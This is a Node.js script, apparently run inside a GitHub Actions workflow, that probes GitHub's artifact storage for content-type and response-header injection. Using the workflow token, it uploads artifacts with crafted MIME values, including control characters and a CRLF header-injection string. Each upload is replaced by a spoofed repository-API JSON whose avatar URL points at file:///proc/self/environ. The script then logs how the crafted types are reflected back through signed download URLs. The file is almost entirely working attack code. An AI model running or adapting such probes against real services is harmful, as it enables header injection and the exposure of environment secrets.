import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const token=process.env.GITHUB_TOKEN;
const sha=b=>createHash('sha256').update(b).digest('hex');
const odd='\u0085application/json';

function req(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);const mod=target.protocol==='https:'?https:http;
    const r=mod.request(target,{method,headers,timeout:20000},res=>{
      const chunks=[];res.on('data',c=>chunks.push(c));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
    });
    r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));
    if(body)r.write(body);r.end();
  });
}
async function upload(url,body){
  const r=await new BlobClient(url).getBlockBlobClient().uploadData(body,{blobHTTPHeaders:{blobContentType:odd}});
  return r;
}
function hex(s){return Buffer.from(String(s),'latin1').toString('hex');}
function rawRsct(loc){
  if(!loc)return null;
  const m=String(loc).match(/[?&]rsct=([^&]*)/);
  return m?m[1]:null;
}

const cases=[
  ['control-json','application/json'],
  ['json-pct85','application/json%85'],
  ['pct85-json','%85application/json'],
  ['json-pct1c','application/json%1C'],
  ['pct1c-json','%1Capplication/json'],
  ['json-pctC285','application/json%C2%85'],
  ['pctC285-json','%C2%85application/json'],
  ['json-pct0d0a','application/json%0D%0AX-Injected:1'],
  ['json-pct09','application/json%09'],
  ['json-pct20','application/json%20'],
  ['json-param-pct85','application/json;x=%85'],
  ['json-pct85-param','application/json%85;charset=utf-8'],
  ['json-pct2585','application/json%2585'],
  ['json-comma-pct85','application/json,%85'],
  ['json-space-nel','application/json \u0085'],
  ['nel-json-literal',odd],
];

for(let i=0;i<cases.length;i++){
  const [label,mime]=cases[i];
  const name=`nelprobe-${runId}-${i}`;
  const rec={label,mimeHex:hex(mime)};
  try{
    const created=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:mime})});
    rec.createOk=created.ok;rec.createUrl=created.signedUploadUrl?new URL(created.signedUploadUrl).pathname.split('/').at(-1):null;
    if(!created.ok)throw new Error('create ok=false');
    const placeholder=Buffer.from('{}');
    await upload(created.signedUploadUrl,placeholder);
    const finalized=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
    rec.finalOk=finalized.ok;rec.artifactId=String(finalized.artifactId||'');
    if(!finalized.ok)throw new Error('finalize ok=false');
    const id=rec.artifactId;
    const carrier=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:label,stargazers_count:0}));
    await upload(created.signedUploadUrl,carrier);
    rec.carrierSha=sha(carrier);
    const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{
      Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-nelprobe'});
    rec.restStatus=api.status;rec.location=api.headers.location||null;rec.rawRsct=rawRsct(api.headers.location);
    if(api.headers.location){
      let dec=null;try{dec=new URL(api.headers.location).searchParams.get('rsct');}catch{}
      rec.decodedRsct=dec;rec.decodedRsctHex=dec==null?null:hex(dec);
      const fin=await req(api.headers.location);
      rec.finalStatus=fin.status;rec.finalCt=fin.headers['content-type']||null;rec.finalCtHex=hex(fin.headers['content-type']||'');
      rec.bodyMatch=fin.body.equals(carrier);
    }
  }catch(e){rec.error=String(e.message||e).slice(0,200)}
  console.log('NELPROBE',JSON.stringify(rec));
}
